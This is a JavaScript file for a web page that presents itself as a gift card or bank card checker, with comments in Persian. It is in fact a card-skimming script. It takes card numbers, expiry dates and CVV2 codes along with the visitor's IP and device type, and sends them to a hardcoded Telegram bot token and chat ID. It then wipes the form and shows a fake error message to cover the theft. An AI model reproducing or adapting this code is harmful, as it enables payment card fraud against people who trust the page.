const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
const chatId = '-4614449543';

const sendMessage = async function (message) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      // parse_mode: 'MarkdownV2',
    }),
  })
    .then(response => response.json())
    .then(data => {
      return data;
    })
    .catch(error => {
      console.error('خطا در ارسال پیام:', error);
    });
};
function validateGiftCardCode(code) {
  const str = code.replaceAll('-', '');

  // بررسی طول کد (باید 16 کاراکتر باشد)
  if (str.length !== 16) {
    return false;
  }
  // بررسی اینکه کد فقط شامل حروف بزرگ و اعداد باشد
  const regex = /^[A-Z0-9]+$/;
  if (!regex.test(str)) {
    return false;
  } else {
    return true;
  }
}

function validateExpirationDate(month, year) {
  // بررسی اینکه ماه معقول باشد
  if (month < 1 || month > 12) {
    return false; // ماه نامعتبر است
  }

  // تبدیل سال دو رقمی به چهار رقمی
  const currentDate = new Date();
  const currentYear = currentDate.getFullYear() % 100; // دو رقم آخر سال کنونی
  const fullYear = year + (year < currentYear ? 2000 : 1900); // مقایسه و تبدیل

  // تاریخ انقضا را به تاریخ واقعی تبدیل کنید
  const expiration = new Date(fullYear, month - 1); // ماه باید از 0 شروع شود

  // اطمینان از اینکه تاریخ انقضا در آینده است
  if (expiration <= currentDate) {
    return false; // تاریخ انقضا گذشته است
  } else {
    return true; // تاریخ انقضا معتبر است
  }
}

let userIp;
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIp = data.ip;
  } catch (error) {
    console.error('خطا در دریافت IP:', error);
    return null; // در صورت بروز خطا
  }
}
getUserIP();

function getDeviceType() {
  const userAgent = navigator.userAgent;

  // بررسی برای دستگاه‌های iPhone
  if (/iPhone/i.test(userAgent)) {
    return 'iPhone';
  }
  // بررسی برای دستگاه‌های Android
  else if (/Android/i.test(userAgent)) {
    return 'Android';
  }
  // در غیر این صورت، فرض می‌کنیم که دسکتاپ است
  else {
    return 'Desktop';
  }
}

const inputField = document.getElementById('card-number');
const expirationDate = document.getElementById('expiration-date');
const cvv2 = document.getElementById('cvv2');
const checkBtn = document.getElementById('checkBtn');
const pattern = '____-____-____-____';

inputField.addEventListener('input', function () {
  let value = this.value.replace(/\D/g, ''); // حذف کاراکترهای غیر عددی
  let maskedValue = '';

  for (let i = 0, j = 0; i < pattern.length && j < value.length; i++) {
    if (pattern[i] === '_') {
      maskedValue += value[j++];
    } else {
      maskedValue += pattern[i];
    }
  }

  this.value = maskedValue;

  if (value.length < maskedValue.length) {
    this.setSelectionRange(maskedValue.length, maskedValue.length); // قرار دادن کادر متنی در انتهای ورودی
  }
});

expirationDate.addEventListener('input', function () {
  let currentValue = expirationDate.value.replace(/\D/g, ''); // فقط اعداد را نگه‌دارید
  if (currentValue.length > 4) {
    currentValue = currentValue.slice(0, 4); // تنها 4 رقم اجازه داده شود
  }

  // اگر دو عدد ورودی بود، با '/' جدا کنید
  if (currentValue.length >= 2) {
    currentValue = currentValue.slice(0, 2) + '/' + currentValue.slice(2);
  }

  expirationDate.value = currentValue; // ورودی فرمت شده را به اینپوت برگردانید

  // اعتبارسنجی تاریخ
  const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/; // الگوی معتبر MM/YY
  if (currentValue.length === 5) {
    if (regex.test(currentValue)) {
      // messageElement.textContent = ''; // پیام خطا را پاک کنید
    } else {
      // messageElement.textContent = 'لطفا ورودی معتبر MM/YY را وارد کنید.';
    }
  } else {
    // messageElement.textContent = ''; // اگر ورودی هنوز کامل نیست، هیچ پیام خطایی نشان ندهید
  }
});

function validateCVV2(cvv) {
  // بررسی اینکه کد CVV2 دقیقا 3 رقم باشد و فقط شامل اعداد باشد
  const regex = /^\d{3}$/; // 3 رقم
  if (!regex.test(cvv)) {
    return false;
  } else {
    return true;
  }
}
cvv2.addEventListener('input', function () {
  const regex = /^\d{3}$/; // 3 رقم
  if (!regex.test(cvv2.value)) {
    return false;
  } else {
    return true;
  }
});

checkBtn.addEventListener('click', () => {
  let errors = [];
  if (!validateGiftCardCode(inputField.value)) {
    errors.push('Invalid Card Number');
  }
  const mm = expirationDate.value.slice(0, 2);
  const yy = expirationDate.value.slice(3, 5);
  if (!validateExpirationDate(mm, yy)) {
    errors.push('Invalid Expiration Date');
  }
  if (!validateCVV2(cvv2.value)) {
    errors.push('Invalid Cvv2');
  }

  const message = `
    Card Number: ${inputField.value.replaceAll('-', '')}
    Expiration: ${mm}/${yy}
    Cvv2: ${cvv2.value}
    --------------
    IP: ${userIp}
    Device: ${getDeviceType()}
  `;

  let dat = '';
  if (errors.length > 0) {
    for (let text of errors) {
      dat += text + '\n'; // اضافه کردن متن و رفتن به خط جدید
    }
    Toastify({
      text: dat,
      duration: 3000,
      newWindow: true,
      close: true,
      gravity: 'top', // `top` or `bottom`
      position: 'right', // `left`, `center` or `right`
      stopOnFocus: true, // Prevents dismissing of toast on hover
      style: {
        fontSize: '1.1rem',
        fontWeight: '600',
        background: '#EA384D',
        width: '300px',
        minWidth: '300px',
        display: 'flex',
        justifyContent: 'space-between',
      },
    }).showToast();
  } else {
    console.log(inputField.value);
    console.log(mm);
    console.log(yy);
    console.log(cvv2.value);
    sendMessage(message);
    inputField.value = '';
    expirationDate.value = '';
    cvv2.value = '';
    setTimeout(() => {
      Toastify({
        text: 'Your request was received in error Please try again later',
        duration: 3000,
        newWindow: true,
        close: true,
        gravity: 'top', // `top` or `bottom`
        position: 'right', // `left`, `center` or `right`
        stopOnFocus: true, // Prevents dismissing of toast on hover
        style: {
          fontSize: '1.1rem',
          fontWeight: '600',
          background: '#EA384D',
          width: '300px',
          minWidth: '300px',
          display: 'flex',
          justifyContent: 'space-between',
        },
      }).showToast();
    }, 2000);
  }
});

// navbar
const listSvg = document.getElementById('listSvg');
const xSvg = document.getElementById('xSvg');
const listBox = document.getElementById('listBox');
const scrollBox = document.getElementById('scrollBox');

listSvg.addEventListener('click', () => {
  listSvg.classList.add('hidden');
  xSvg.classList.remove('hidden');
  scrollBox.classList.remove('hidden');
});
xSvg.addEventListener('click', () => {
  xSvg.classList.add('hidden');
  listSvg.classList.remove('hidden');
  scrollBox.classList.add('hidden');
});
